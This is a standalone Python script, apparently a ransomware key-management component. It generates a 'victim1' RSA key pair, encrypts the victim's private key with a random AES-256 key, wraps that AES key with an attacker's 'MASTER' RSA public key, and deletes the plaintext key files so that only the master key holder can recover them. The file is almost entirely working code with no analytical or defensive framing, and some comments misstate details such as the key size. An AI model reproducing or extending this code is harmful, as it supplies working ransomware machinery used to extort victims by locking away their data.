from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Function to generate RSA key pair (1024-bit) for victim1 keys
def generate_rsa_keys():
    # Generate victim1 RSA key pair (1024-bit)
    victim1_private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    victim1_public_key = victim1_private_key.public_key()

    # Save victim1 private key to file (victim1_private_key.pem)
    with open("victim1_private_key.pem", "wb") as victim1_private_key_file:
        victim1_private_key_file.write(
            victim1_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    # Save victim1 public key to file (victim1_public_key.pem)
    with open("victim1_public_key.pem", "wb") as victim1_public_key_file:
        victim1_public_key_file.write(
            victim1_public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

    print(">> RSA key pair generated and saved as 'victim1_private_key.pem' and 'victim1_public_key.pem'.")

# Encrypt a file using AES (victim1_private_key.pem)
def encrypt_file_using_aes(file_path, aes_key):
    # Initialize AES encryption (using CBC mode)
    iv = os.urandom(16)  # AES block size for CBC mode
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Read the file (victim1_private_key.pem)
    with open(file_path, "rb") as file:
        file_data = file.read()

    # Pad the data to be a multiple of 16 bytes
    pad_len = 16 - len(file_data) % 16
    padded_data = file_data + bytes([pad_len]) * pad_len

    # Encrypt the file data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Save the encrypted file data with IV prepended (victim1_private_key.pem.encrypted)
    with open("victim1_private_key.pem.encrypted", "wb") as encrypted_file:
        encrypted_file.write(iv + encrypted_data)  # Prepend IV to encrypted data

    print(f">> RSA key '{file_path}' has been encrypted with AES key 'victim1_aes_key.bin' and saved as 'victim1_private_key.pem.encrypted'.")

# Save AES key as binary file (victim1_aes_key.bin)
def save_aes_key_as_bin(aes_key):
    # Save AES key to a binary file (victim1_aes_key.bin)
    with open("victim1_aes_key.bin", "wb") as aes_key_file:
        aes_key_file.write(aes_key)

    print(">> AES key has been saved as 'victim1_aes_key.bin'.")

# Encrypt the AES key using RSA public key
def encrypt_aes_key_with_rsa(aes_key):
    # Load the RSA public key from file (MASTER_public_key.pem)
    with open("MASTER_public_key.pem", "rb") as public_key_file:
        public_key = serialization.load_pem_public_key(public_key_file.read())

    # Encrypt the AES key with RSA public key using OAEP padding
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted AES key to a binary file (encrypted_aes_key.bin)
    with open("victim1_aes_key.bin.encrypted", "wb") as aes_key_file:
        aes_key_file.write(encrypted_aes_key)

    print(">> AES key 'victim1_aes_key.bin' has been encrypted with RSA public key 'MASTER_public_key.pem' and saved as 'victim1_aes_key.bin.encrypted'.")

# Delete the generated files after encryption
def delete_generated_files():
    try:
        os.remove("victim1_aes_key.bin")
        os.remove("victim1_private_key.pem")
        print("!! Original files 'victim1_aes_key.bin' and 'victim1_private_key.pem' has been deleted after encryption.")
    except OSError as e:
        print(f"Error deleting files: {e}")

# Example usage
if __name__ == "__main__":
    generate_rsa_keys()  # Generate RSA key pair for victim1 keys
    
    # Generate a random AES key (256-bit)
    aes_key = os.urandom(32)  # AES-256 key
    save_aes_key_as_bin(aes_key)  # Save the AES key as a binary file
    
    # Encrypt the victim1 private key using AES
    encrypt_file_using_aes("victim1_private_key.pem", aes_key)  # Encrypt the victim1_private_key.pem with AES
    
    # Encrypt the AES key using the public RSA key
    encrypt_aes_key_with_rsa(aes_key)  # Encrypt the AES key with the public key from public_key.pem
    
    # Delete the generated files after encryption
    delete_generated_files()  # Delete victim1_aes_key.bin and victim1_private_key.pem
